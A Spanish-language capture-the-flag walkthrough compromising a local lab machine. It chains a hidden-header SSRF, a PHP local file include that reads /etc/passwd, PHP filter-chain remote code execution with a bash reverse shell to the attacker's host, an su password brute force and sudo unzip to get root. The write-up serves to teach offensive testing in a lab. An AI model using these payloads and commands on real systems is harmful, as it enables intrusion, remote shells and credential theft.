## Reconocimiento:

Puerto 80 : http

En la página no se ve nada interesante y decidí hacer un fuzz de directiorios:

```bash
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Donde se encuentra el archivo status.php pero reporta un error 403.

Estuve un rato intentando un LFI y nada, así que opte por ver el writeup de la maquina y encuentro que el fuzzing con Nikto reporta algo.

```bash
nikto -h http://<IP> -C all
```

“uncommon header ‘statusid’ found”

Asi que utilizo Burpsuite para interceptar la petición GET a /status.php.

Petición Cliente:

```bash
GET /status.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Petición Servidor:

```bash
HTTP/1.1 403 Forbidden
Date: Sun, 13 Jul 2025 07:43:41 GMT
Server: Apache/2.4.58 (Ubuntu)
Statusid: 0
Content-Length: 5197
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

Y comprobamos que tiene como respuesta el Statusid.

Asi que usando el Repeater modificamos la peticion cliente y agregamos “Statusid: 1” debajo del parametro “Accept-Encoding”. Vemos una nueva respuesta con lo que parece una pagina web “secreta” que permite verificar el estado HTTP de una URL proporcionada.

Se expone la vulnerabilidad SSRF (Server-Side Request Forgery)

El objetivo es hacer que el servidor realice peticiones en nuestro nombre a recursos internos que no son visibles desde el exterior.

Se prueba con:

```bash
http://127.0.0.1
```

E intercepto la petición POST, la mando al intruder y le hago un ataque de numeros al puerto del parametro URL. Después de un rato encuentra contenido adicional en el puerto 3222

Modificando la petición POST, agregando los parametros:

```bash
Statusid: 1
...
url=http://127.0.0.1:3222/backups
```

Revela una URL con un archivo zip que se descarga al introducirla en la web:

```bash
http://localhost/061400ca5d384de48f37a71ec23cc518/backups/backup_5025a3123660d066c9ba8617c0cd92d5.zip
```

Al descomprimirlo interesa el archivo file.php:

```bash
<?php 
if($_SERVER['REQUEST_METHOD'] === 'GET'){
    $file = $_GET['72e22dffd7fa10883a85aa3e0bbbd6d4'];
    include($file);
}
?>
```

El script nos deja leer archivos con el parametro GET, asi que intento leer el /etc/passwd con la ruta completa al archivo y la linea de caracteres del parametro $_GET:

```bash
URL = http://<IP_VICTIM>/061400ca5d384de48f37a71ec23cc518/cc8e38c20e4e2f58291c0f8b2e3ace5f/dev/file.php?72e22dffd7fa10883a85aa3e0bbbd6d4=/etc/passwd
```

Info:

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
baluton:x:1001:1001:baluton,,,:/home/baluton:/bin/bash
_galera:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:102:MariaDB Server,,,:/nonexistent:/bin/false
redghost:x:1002:1002:redghost,,,:/home/redghost:/bin/bash
```

Se confirma LFI / RFI usando wrappers

Vamos a utilizar una herramienta de `GitHub` que nos automatiza el proceso de codificar el `payload` que vamos a injectar en la `URL`.

URL = https://github.com/synacktiv/php_filter_chains_oracle_exploit/blob/main/filters_chain_oracle_exploit.py

Vamos a crear un parametro llamado `cmd` que ejecute cualquier comando que le pongamos, tendremos que ejecutarlo de esta forma:

```bash
python3 php_filter_chain_generator.py --chain '<?php echo shell_exec($_GET["cmd"]);?>'
```

Nos ponemos en escucha: 

```bash
nc -lvnp <PORT>
```

Desde la URL:

```bash
URL = http://172.17.0.2/061400ca5d384de48f37a71ec23cc518/cc8e38c20e4e2f58291c0f8b2e3ace5f/dev/file.php?cmd=bash%20-c%20"bash%20-i%20>%26%20/dev/tcp/172.17.0.1/4444 0>%261"&72e22dffd7fa10883a85aa3e0bbbd6d4=php://...
```

## Escalada www-data → baluton

Nada sirve, toca un ataque de fuerza bruta con script ya que no hay ssh para un hydra.

https://github.com/D1se0/suBruteforce/blob/main/suBruteforceBash/suBruteforce.sh

```bash
cd /tmp
nano fb.sh
chmod +x fb.sh
```

Nos pasamos el diccionario:

```bash
cp /usr/share/wordlists/rockyou.txt rockyou.txt
python3 -m http.server 80
```

Lo traemos desde la maquina victima:

```bash
wget http://172.17.0.1/rockyou.txt
```

y ejecutamos el script:

```bash
./fb.sh baluton rockyou.txt
```

Se encuentra la contraseña : 123123 y migramos de usuario.

## Escalada baluton → root

```bash
sudo -l
(ALL) NOPASSWD /usr/bin/unzip
```

Convenientemente en el directorio raíz se encuentra un archivo zip llamado “secretitosecretazo.zip” 

```bash
sudo unzip /secretitosecretazo.zip
```

Contiene las credenciales de root

Listo.
